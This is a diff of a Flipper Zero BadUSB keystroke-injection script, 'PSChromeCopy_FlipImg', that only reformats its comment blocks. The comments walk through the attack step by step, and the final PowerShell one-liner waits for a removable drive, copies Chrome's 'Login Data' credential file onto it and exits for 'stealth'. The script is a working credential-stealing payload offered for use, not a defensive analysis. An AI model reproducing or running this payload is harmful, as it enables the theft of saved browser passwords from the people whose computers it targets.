@@ -1,14 +1,14 @@
-REM_BLOCK
-
- Title: 		PSChromeCopy_FlipImg
- Author: 		aves-frog
- Description: 	Copies Chrome Login Data to flipper img/Last inserted USB
- Target:		Windows 10+
- 
- Note: 			This script looks for the last inserted USB, as such you do not need to use an image on your flipper
-				It does however give you the time to navigate to Apps/USB/Mass Storage (or alternative) without using a time limit
- 
-END_REM
+REM
+REM
+REM Title: 		PSChromeCopy_FlipImg
+REM Author: 		aves-frog
+REM Description: 	Copies Chrome Login Data to flipper img/Last inserted USB
+REM Target:		Windows 10+
+REM 
+REM Note: 			This script looks for the last inserted USB, as such you do not need to use an image on your flipper
+REM				It does however give you the time to navigate to Apps/USB/Mass Storage (or alternative) without using a time limit
+REM 
+REM
 
 REM *If this script doesn't work, please try removing all empty lines and the REM_Block*
 
@@ -39,35 +39,35 @@ DELAY 10
 STRING $Time = Get-Date -Format "dd-MM-yyyy-HH-mm-ss"
 ENTER
 
-REM_BLOCK
-	This is the most fun piece of code. The reason this is all in one chunk/line is to allow the users of flipper USB images to navigate to the image while still
-	being able to continue the script (BadUSB cannot run simultaniously, however a previous command will finish).
-	
-	PowerShell allows combining multiple commands via the ';' symbol, as such you will find this line split up as such.
-	We start with '$newEvent = Wait-Event -SourceIdentifier volumeChange', this code talks to the listener (that we called in the first command) and waits until it
-	receives confirmation that a new USB storage device is found (note keyboards and such do not update this listener).
-	This also means that if you are planning on using a different USB storage device you should wait with plugging it in until this moment, alternatively remove the listeners.
-	
-	The next command is a simple 'Start-Sleep', ergo wait for 2 seconds, this allows a slower PC to initialize the storage device properly.
-	Removing this command may result in failure or in loss of the Login Data.
-	
-	Up next is '$DriveLetter = volume | ? drivetype -eq removable | % driveletter', this commands looks at the connected USB drives and saves the drive letter (D:/, F:/, etc) in a variable.
-	Without this code you will not be able to copy the file to the drive, unless you know which drive letter will be assigned.
-	Possible complications may lay in having other USB storage drives connected, to be safe you can remove these temporarily.
-	Alternatively you can hard code a drive letter that you assign manually on the pc.
-	
-	In order to give the file a proper name and copy it to the found disk we use '$Path = $DriveLetter + ":/" + $Time + ".txt"'
-	Note how the extention is .txt which allows for immediate reading using a SQLite DB, you can change this filetype as you wish, but know the encoding of the Login Data is in SQLite,
-	so the extention and application need to support this encoding.
-	Possible complications in older PC's could be the ':/' signifyer of disk (D:/), older PC's may require you to use '://' or even ':\\' instead.
-	This script was tested on windows 11, in this version the current usage will work where using '://' will not. You will need to find out which works best for your usage.
-	As far as my best understanding after windows 7/8 the usage changed, so windows 10 or higher versions should work out of the box.
-	
-	Lastly we have 'Copy-Item -Path "./Login Data" -Destination $Path -Recurse' followed by 'exit'.
-	'exit' simply closes PowerShell for convenience and 'stealth'.
-	'Copy-Item -Path "./Login Data"' specifies the file we wish to copy, note how 'Login Data' does NOT have an extension.
-	'-Destination $Path -Recurse' specifies the destination of the copy to be the variable $Path as mentioned above, '-Recursive' allows for a non existing folder to be created
-	should you wish to data manage your flipper better than I am :P.
-END_REM
+REM
+REM	This is the most fun piece of code. The reason this is all in one chunk/line is to allow the users of flipper USB images to navigate to the image while still
+REM	being able to continue the script (BadUSB cannot run simultaniously, however a previous command will finish).
+REM	
+REM	PowerShell allows combining multiple commands via the ';' symbol, as such you will find this line split up as such.
+REM	We start with '$newEvent = Wait-Event -SourceIdentifier volumeChange', this code talks to the listener (that we called in the first command) and waits until it
+REM	receives confirmation that a new USB storage device is found (note keyboards and such do not update this listener).
+REM	This also means that if you are planning on using a different USB storage device you should wait with plugging it in until this moment, alternatively remove the listeners.
+REM	
+REM	The next command is a simple 'Start-Sleep', ergo wait for 2 seconds, this allows a slower PC to initialize the storage device properly.
+REM	Removing this command may result in failure or in loss of the Login Data.
+REM	
+REM	Up next is '$DriveLetter = volume | ? drivetype -eq removable | % driveletter', this commands looks at the connected USB drives and saves the drive letter (D:/, F:/, etc) in a variable.
+REM	Without this code you will not be able to copy the file to the drive, unless you know which drive letter will be assigned.
+REM	Possible complications may lay in having other USB storage drives connected, to be safe you can remove these temporarily.
+REM	Alternatively you can hard code a drive letter that you assign manually on the pc.
+REM	
+REM	In order to give the file a proper name and copy it to the found disk we use '$Path = $DriveLetter + ":/" + $Time + ".txt"'
+REM	Note how the extention is .txt which allows for immediate reading using a SQLite DB, you can change this filetype as you wish, but know the encoding of the Login Data is in SQLite,
+REM	so the extention and application need to support this encoding.
+REM	Possible complications in older PC's could be the ':/' signifyer of disk (D:/), older PC's may require you to use '://' or even ':\\' instead.
+REM	This script was tested on windows 11, in this version the current usage will work where using '://' will not. You will need to find out which works best for your usage.
+REM	As far as my best understanding after windows 7/8 the usage changed, so windows 10 or higher versions should work out of the box.
+REM	
+REM	Lastly we have 'Copy-Item -Path "./Login Data" -Destination $Path -Recurse' followed by 'exit'.
+REM	'exit' simply closes PowerShell for convenience and 'stealth'.
+REM	'Copy-Item -Path "./Login Data"' specifies the file we wish to copy, note how 'Login Data' does NOT have an extension.
+REM	'-Destination $Path -Recurse' specifies the destination of the copy to be the variable $Path as mentioned above, '-Recursive' allows for a non existing folder to be created
+REM	should you wish to data manage your flipper better than I am :P.
+REM
 STRING $newEvent = Wait-Event -SourceIdentifier volumeChange; Start-Sleep -Seconds 2; $DriveLetter = volume | ? drivetype -eq removable | % driveletter; $Path = $DriveLetter + ":/" + $Time + ".txt"; Copy-Item -Path "./Login Data" -Destination $Path -Recurse; exit
 ENTER
